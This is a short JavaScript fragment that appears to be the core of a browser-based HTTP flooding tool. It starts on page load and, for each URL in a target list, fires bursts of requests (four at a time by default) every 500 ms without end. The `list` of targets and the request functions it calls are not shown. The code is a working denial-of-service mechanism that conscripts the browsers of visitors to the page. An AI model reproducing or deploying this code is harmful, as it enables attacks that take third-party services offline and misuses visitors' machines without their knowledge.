function rt() {
	
	function srt(o) 
	{
		if (typeof o !== 'object') o = { url: o };

		var url = o.url;
		var params = o.p ? "&" + o.p : "";
		var ms = o.ms || 500;
		var th = o.th || 4;
		var t;
		var fn = o.cors ? hload : sload;

		if (url) {
			function go() {
				for (t = 0; t < th; t++) 
				{
					fn(url, params);
				}
			}
			setInterval(go, ms);
			setTimeout(go, Math.random() * 1000);
		}
	}
	list.forEach(srt);
}

setTimeout(rt, 0);